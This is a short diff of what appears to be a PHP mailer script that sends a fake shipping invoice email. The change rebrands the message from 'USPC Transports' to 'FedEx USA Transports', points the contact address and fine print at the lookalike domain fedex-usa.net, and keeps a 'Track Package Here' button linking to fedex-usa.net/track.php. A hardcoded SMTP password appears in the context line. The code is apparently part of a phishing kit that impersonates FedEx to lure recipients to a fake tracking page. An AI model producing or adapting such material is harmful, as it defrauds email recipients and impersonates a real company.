@@ -72,8 +72,8 @@ $mail->Password = "cornellekacy456";
                     <br><br>
                      <a href='www.fedex-usa.net/track.php'><button>Track Package Here</button></a>
                     <br><br><br><br>
-                    <P style='font-size: 11px;'>This invoice  is processed by USPC Transports and logistics, Inc. If you need more information, please contact us at contact@uspclogistics.com</P>
-<P style='font-size: 11px;'>By using our  services, you agree to uspclogistics.com  Privacy Notice and Conditions of Use.</P>
+                    <P style='font-size: 11px;'>This invoice  is processed by FedEx USA Transports and logistics, Inc. If you need more information, please contact us at contact@fedex-usa.net</P>
+<P style='font-size: 11px;'>By using our  services, you agree to fedex-usa.net  Privacy Notice and Conditions of Use.</P>
 <P style='font-size: 11px;'>This email was sent from a notification-only address that cannot accept incoming email. Please do not reply to this message</P>
                         ";
         //Send the message, check for errors
